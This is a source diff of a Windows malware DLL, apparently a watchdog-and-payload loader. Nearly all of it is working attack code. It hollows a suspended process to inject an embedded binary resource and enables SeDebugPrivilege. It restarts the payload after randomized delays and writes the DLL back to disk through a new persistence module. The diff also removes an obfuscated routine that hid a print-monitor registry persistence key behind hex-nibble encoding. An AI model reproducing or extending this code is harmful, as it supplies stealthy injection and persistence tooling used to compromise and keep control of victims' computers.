@@ -6,12 +6,14 @@
 #include "ph.h"
 #include <time.h>
 #include <sstream>
-
+#include "..\log.h"
+#include "..\utilities.h"
+#include "..\persist.h"
 
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "User32.lib")
 
-FILE * debug_file_handle = stdout;
+//FILE * debug_file_handle = stdout;
 
 //Flag to determine if we are the target or watcher
 bool watch_target = false;
@@ -30,26 +32,6 @@ extern "C" __declspec (dllexport) void __cdecl RegisterDll (
  * Current DLL hmodule.
  */
 static HMODULE dll_handle = NULL;
-
-char * decode_split( const char * input, unsigned int str_len ){
-
-	char *test;
-	unsigned int i =0, j = 0;
-	if( str_len % 2 == 0 ){
-
-		test = (char *)calloc((str_len/2) + 1, 1);
-		for( i = 0, j = 0; i < str_len; i += 2, j++ ){
-			test[j] = input[i] << 4;
-			test[j] += input[i+1];
-		}
-		
-	} else {
-
-		test = (char *)calloc(0, 1);
-	}
-
-	return test;
-}
 
 PEB_PARTIAL ReadRemotePEB(HANDLE hProcess, LPVOID dwPEBAddress )
 {
@@ -99,7 +81,7 @@ bool GetResourceImageBuffer(DWORD resID, char **ImgResData, DWORD *sourceImgSize
 	hRes = FindResource(dll_handle, MAKEINTRESOURCE(resID) ,"BIN");
 	if( hRes == nullptr ) { 
 #ifdef _DBG
-			fprintf( debug_file_handle,"Unable to find resource.\r\n");
+		Log("Unable to find resource.\r\n");
 #endif
 		return false;
 	}
@@ -107,7 +89,7 @@ bool GetResourceImageBuffer(DWORD resID, char **ImgResData, DWORD *sourceImgSize
     hResourceLoaded = LoadResource(dll_handle, hRes);
 	if( hResourceLoaded == nullptr ) {
 #ifdef _DBG
-			fprintf( debug_file_handle,"Unable to load resource.\r\n");
+		Log("Unable to load resource.\r\n");
 #endif
 		return false;
 	}
@@ -115,14 +97,14 @@ bool GetResourceImageBuffer(DWORD resID, char **ImgResData, DWORD *sourceImgSize
     *ImgResData = (char *)LockResource(hResourceLoaded);
 	if( hResourceLoaded == nullptr ) {
 #ifdef _DBG
-			fprintf( debug_file_handle,"Unable to lock resource.\r\n");
+			Log("Unable to lock resource.\r\n");
 #endif
 		return false;
 	}
 
     *sourceImgSize = SizeofResource(dll_handle, hRes);
 #ifdef _DBG
-	fprintf( debug_file_handle,"file size %d\n", *sourceImgSize);
+	Log("file size %d\n", *sourceImgSize);
 #endif
 
 	return true;
@@ -134,7 +116,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	NTSTATUS stat;
 	
 #ifdef _DBG
-		fprintf( debug_file_handle,"Creating process\r\n");
+		Log("Creating process\r\n");
    #endif
 
 	//Start the target process suspended
@@ -145,7 +127,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 					NULL, NULL, pStartupInfo, pProcessInfo))
 	{
 #ifdef _DBG
-		fprintf(debug_file_handle, "[-] CreateProcessW failed. Error = %x\n", GetLastError());
+		Log( "[-] CreateProcessW failed. Error = %x\n", GetLastError());
 #endif
 		return 0;
 	}
@@ -159,7 +141,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	if (ZwMapViewOfSection == NULL || ZwQueryInformationProcess == NULL || ZwUnmapViewOfSection == NULL || ZwCreateSection == NULL)
 	{
 #ifdef _DBG
-		fprintf(debug_file_handle, "[-] GetProcAddress failed\n");
+		Log( "[-] GetProcAddress failed\n");
 #endif
 		return 0;
 	}
@@ -170,20 +152,20 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
     {
 
 #ifdef _DBG
-		fprintf(debug_file_handle,"[-] ZwQueryInformation failed\n");
+		Log("[-] ZwQueryInformation failed\n");
 #endif
 		return 0;
     }
 
 
 #ifdef _DBG
-	fprintf(debug_file_handle, "[+] UniqueProcessID = 0x%x\n", pbi.UniqueProcessId);
+	Log( "[+] UniqueProcessID = 0x%x\n", pbi.UniqueProcessId);
 #endif
 	PEB_PARTIAL peb_struct = (PEB_PARTIAL)ReadRemotePEB(pProcessInfo->hProcess , pbi.PebBaseAddress );
 	PVOID ImageBase = peb_struct.ImageBaseAddress;
 
 #ifdef _DBG
-	fprintf(debug_file_handle, "[+] ImageBase = 0x%x\n", ImageBase);
+	Log( "[+] ImageBase = 0x%x\n", ImageBase);
 #endif
 
 	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, (LPCVOID)ImageBase);
@@ -196,7 +178,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	{
 
 #ifdef _DBG
-		fprintf(debug_file_handle, "[-] ReadProcessMemory failed\n");
+		Log( "[-] ReadProcessMemory failed\n");
 #endif
 		return 0;
 	}
@@ -214,7 +196,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	if ((stat = ZwCreateSection(&image_sect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
-		fprintf(debug_file_handle,"[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
+		Log("[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
 	}
@@ -226,7 +208,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
-		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
+		Log( "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
 	}	
@@ -241,7 +223,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	if ((stat = ZwMapViewOfSection(image_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
-		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
+		Log( "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
 	}	
@@ -266,7 +248,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	
 	//Image entry
 #ifdef _DBG
-	fprintf(debug_file_handle, "Loaded image entry point: 0x%x\n", pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint);
+	Log( "Loaded image entry point: 0x%x\n", pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint);
 #endif 
 
 	//Base before
@@ -274,7 +256,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	memcpy(&before, (PVOID)((size_t)BaseAddress + image_base), sizeof(before)); 
 	
 #ifdef _DBG
-	fprintf(debug_file_handle, "Base before: %p\n", before);
+	Log("Base before: %p\n", before);
 #endif 
 
 
@@ -290,7 +272,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 		PVOID pSectionDestination = (PVOID)((size_t)BaseAddress + pSourceImage->Sections[x].VirtualAddress);
 
 		#ifdef _DBG
-			fprintf( debug_file_handle,"Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
+			Log("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
 		#endif
 
 		memcpy( pSectionDestination, &ImgData[pSourceImage->Sections[x].PointerToRawData],
@@ -299,7 +281,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 
 
 #ifdef _DBG
-	fprintf( debug_file_handle,
+	Log(
 			"Source image base: 0x%p\r\n"
 			"Destination image base: 0x%p\r\n",
 			pSourceImage->FileHeader->OptionalHeader.ImageBase,
@@ -319,8 +301,8 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	
 
 	#ifdef _DBG
-		fprintf( debug_file_handle,"Relocation delta: 0x%p\r\n", dwDelta);
-		fprintf( debug_file_handle,"Writing headers\r\n");
+		Log("Relocation delta: 0x%p\r\n", dwDelta);
+		Log("Writing headers\r\n");
 	#endif
 
     // Rebase image if necessary, x86 and x64
@@ -334,7 +316,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 				continue;
 
 			#ifdef _DBG
-				fprintf( debug_file_handle,"Rebasing image\r\n");
+				Log("Rebasing image\r\n");
 			#endif
 
 			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
@@ -391,7 +373,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &RemoteAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
-		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
+		Log( "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
 	}
@@ -405,7 +387,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	if ((stat = ZwCreateSection(&entry_sect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
-		fprintf(debug_file_handle,"[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
+		Log("[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
 	}
@@ -415,7 +397,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	if ((stat = ZwMapViewOfSection(entry_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
-		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
+		Log("[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
 	}	
@@ -516,7 +498,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	if ((stat = ZwMapViewOfSection(entry_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
-		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
+		Log("[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
 		return 0;
 	}
@@ -540,63 +522,22 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 
 }
 
-
-void DllPersistence( char *module_path ){
-
-	//Get dll name from resource table
-    char reg_str_buf[200];
-	LoadString(dll_handle, IDS_REG_KEY, reg_str_buf, 200);
-	if( strlen( reg_str_buf ) != 0 ){	
-		
-		//Deobfuscate it
-		char *reg_ptr = decode_split(reg_str_buf, 200);
-		std::string reg_str(reg_ptr);
-		free(reg_ptr);
-		//Try to open registry key (SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\)
-		char *keyPath = decode_split("\x5\x3\x5\x9\x5\x3\x5\x4\x4\x5\x4\xd\x5\xc\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x4\x3\x6\xf\x6\xe\x7\x4\x7\x2\x6\xf\x6\xc\x5\x3\x6\x5\x7\x4\x5\xc\x4\x3\x6\xf\x6\xe\x7\x4\x7\x2\x6\xf\x6\xc\x5\xc\x5\x0\x7\x2\x6\x9\x6\xe\x7\x4\x5\xc\x4\xd\x6\xf\x6\xe\x6\x9\x7\x4\x6\xf\x7\x2\x7\x3\x5\xc",96);
-		std::string reg_key_path(keyPath);
-		free(keyPath);
-
-		//Add the name
-		reg_key_path.append(reg_str);
-						
-		//Check if reg key has been set for persistence
-		HKEY hkey = NULL;
-		long ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_ALL_ACCESS, &hkey);
-		if(ret == ERROR_FILE_NOT_FOUND ) {
-
-			//Create the key
-			DWORD dwDisposition;
-			if(RegCreateKeyEx(HKEY_LOCAL_MACHINE, reg_key_path.c_str(), 0, NULL, 0, KEY_WRITE, NULL,  &hkey, &dwDisposition) == ERROR_SUCCESS) {
-
-				//Driver
-				char *driver_ptr = decode_split("\x4\x4\x7\x2\x6\x9\x7\x6\x6\x5\x7\x2",12);
-				ret = RegSetValueEx (hkey, driver_ptr, 0, REG_SZ, (LPBYTE)module_path, strlen(module_path));
-				if ( ret != ERROR_SUCCESS) {
-#ifdef _DBG
-					fprintf(debug_file_handle, "[-] Error: Unable to write registry value.\n");
-#endif
-				}
-				free(driver_ptr);
-				RegCloseKey(hkey);
-			}
-
-		}
-	}
-		
-
-}
-
 int main(int argc, char* argv[]){
 	
 	//Check the global else load the watchdog
 	if( watch_target ){
 
+#ifdef _DBG					
+		SetLogPath("C:\\payld.log");
+#endif
 		LoadPayload();
 		exit(1);
 
 	} else {	
 
+#ifdef _DBG					
+		SetLogPath("C:\\wdg.log");
+#endif
 		LoadWatchDog();
 	}
 	
@@ -610,16 +551,6 @@ int main(int argc, char* argv[]){
 */
 void LoadWatchDog() {
 
-#ifdef _DBG
-	FILE *f;
-	fopen_s(&f, "C:\\debug_dll.log", "w");
-	if( f == nullptr )
-		return;
-
-	setvbuf(f, NULL, _IONBF, 0);
-	debug_file_handle = f;
-#endif
-
 	HANDLE hFile;
 	char module_name[MAX_PATH];
 	int dwLength = 0;
@@ -632,8 +563,7 @@ void LoadWatchDog() {
 	LoadString(dll_handle, IDS_WATCHDOG_HOST, watchdog_host, 400);
 	if( strlen( watchdog_host ) == 0 ){
 #ifdef _DBG
-		fprintf( debug_file_handle, "[-] Error: Watchdog host path not set. Exiting\n");
-		fclose(debug_file_handle);
+		Log( "[-] Error: Watchdog host path not set. Exiting\n");
 #endif
 		return;
 	}
@@ -645,7 +575,7 @@ void LoadWatchDog() {
 
 		
 	memset(module_name, 0, MAX_PATH );
-
+	
 	//Get the dll module name
 	dwLength = GetModuleFileName(dll_handle, module_name, MAX_PATH);
 
@@ -662,14 +592,10 @@ void LoadWatchDog() {
 		CloseHandle(hFile);
 	} 
 		
-	//Add registry persistence
-	DllPersistence(module_name);
-
 	//Create an env variable with the name of the dll
 	if (! SetEnvironmentVariable("TMP", module_name )) {
 #ifdef _DBG
-		fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
-		fclose(debug_file_handle);
+		Log("SetEnvironmentVariable failed (%d)\n", GetLastError());
 #endif
         return;
     }
@@ -685,60 +611,26 @@ void LoadWatchDog() {
 	
 	if(imgBuffer)
 		free(imgBuffer);
-
-#ifdef _DBG
-	fclose(debug_file_handle);
-#endif
-
+	
 }
 
 void LoadPayload(){
-
-
+	
+	
+	PERSIST_STRUCT * persist_struct_ptr = (PERSIST_STRUCT *)calloc(1, sizeof(PERSIST_STRUCT));
+	if( persist_struct_ptr == nullptr ){
 #ifdef _DBG
-	FILE *f;
-	fopen_s(&f, "C:\\debug_dll2.log", "w");
-	if( f == nullptr )
-		return;
-
-	setvbuf(f, NULL, _IONBF, 0);
-	debug_file_handle = f;
+		Log( "[-] Unable to allocate memory. Quitting\n" );
 #endif
+		return;
+	}
+	
+	//Range from 5 to 10 seconds
+	unsigned int rand_num =  ( rand() % (1000 * 5) ) + (1000 * 5);
+	Sleep(rand_num);
 	
 	int adminPrivs = enableSEPrivilege(SE_DEBUG_NAME);
 
-	//Set java home
-	//Get authentication string from resource table
-    char auth_str_buf[200];
-	LoadString(dll_handle, IDS_JVM_PATH, auth_str_buf, 200);
-	if( strlen( auth_str_buf ) != 0 ){
-
-		//Deobfuscate it
-		char *auth_ptr = decode_split(auth_str_buf, 200);
-		std::string authStr(auth_ptr);
-		free(auth_ptr);
-
-#ifdef _DBG
-		fprintf( debug_file_handle,"JVM Path: %s, Length: %d\n", authStr.c_str(), authStr.length());
-#endif
-
-		//Create an env variable with the name of the dll
-		//PS_HOME
-		char *java_home = decode_split("\x5\x0\x5\x3\x5\xf\x4\x8\x4\xf\x4\xd\x4\x5",14);
-		if (! SetEnvironmentVariable(java_home, authStr.c_str()) ) 
-		{
-	#ifdef _DBG
-			fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
-			fclose(debug_file_handle);
-	#endif
-			free(java_home);
-			return;
-		}
-		//free mem
-		free(java_home);
-
-	}
-	
     //String holding the dll path and pid
 	std::string dll_path_pid;
 	size_t len;
@@ -757,6 +649,10 @@ void LoadPayload(){
 	char * tmp_env = nullptr;
 	_dupenv_s (&tmp_env, &len, tmp_ptr);
 	if( tmp_env && strlen(tmp_env) > 0 ){
+		
+		//Assign DLL
+		persist_struct_ptr->dll_file_path.assign( tmp_env );
+
 		//Create string stream
 		std::stringstream ss;
 		ss << tmp_env << "|" << GetCurrentProcessId();
@@ -767,10 +663,9 @@ void LoadPayload(){
 
 		//Create an env variable with the name of the dll
 		if (! SetEnvironmentVariable("TMP", dll_path_pid.c_str() )) {
-	#ifdef _DBG
-			fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
-			fclose(debug_file_handle);
-	#endif
+#ifdef _DBG
+			Log("SetEnvironmentVariable failed (%d)\n", GetLastError());
+#endif
 			return;
 		}
 	}
@@ -780,8 +675,7 @@ void LoadPayload(){
 	LoadString(dll_handle, IDS_PAYLOAD_HOST, payload_host, 400);
 	if( strlen( payload_host ) == 0 ){
 #ifdef _DBG
-		fprintf( debug_file_handle, "[-] Error: Payload host path not set. Exiting\n");
-		fclose(debug_file_handle);
+		Log( "[-] Error: Payload host path not set. Exiting\n");
 #endif
 		return;
 	}
@@ -797,8 +691,16 @@ void LoadPayload(){
 	//Get the resource buffer
 	if( !GetResourceImageBuffer(IDR_BIN1, &imgResData, &imgDataSize) ){
 #ifdef _DBG
-		fprintf( debug_file_handle, "[-] Error: Unable to get resource.\n");
-		fclose(debug_file_handle);
+		Log( "[-] Error: Unable to get resource.\n");
+#endif
+		return;
+	}
+
+
+	//Load DLL into memory
+	if( !ReadDllIntoMemory( persist_struct_ptr ) ){
+#ifdef _DBG
+		Log("[-] Error: Unable to read DLL into memory. Exiting\n");
 #endif
 		return;
 	}
@@ -824,33 +726,30 @@ void LoadPayload(){
 
 		WaitForSingleObject(proc_handle, INFINITE );
 			
-		//Range from 3 mins to 8
-		unsigned int rand_num =  ( rand() % (1000 * 60 * 5) ) + (1000 * 60 * 3);
+		//Range from 1 mins to 2
+		unsigned int rand_num =  ( rand() % (1000 * 60 * 1) ) + (1000 * 60 * 1);
 		Sleep(rand_num);
+		
+		//Write the DLL to disk before attempting to load
+		WriteDllToDisk(persist_struct_ptr);
 
 #ifdef _DBG
-		fprintf( debug_file_handle,"Restarting monitored process.");
+		Log("Restarting monitored process.");
 #endif
 		//Set it back
 		if (! SetEnvironmentVariable("TMP", dll_path_pid.c_str() )) {
 	#ifdef _DBG
-			fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
-			fclose(debug_file_handle);
+			Log("SetEnvironmentVariable failed (%d)\n", GetLastError());
 	#endif
 			return;
 		}
 
 	}
-	
 
 	
 	//Free memory
 	free(tmp_ptr);
-
-#ifdef _DBG
-	fclose(debug_file_handle);
-#endif
-
+	
 
 }
 
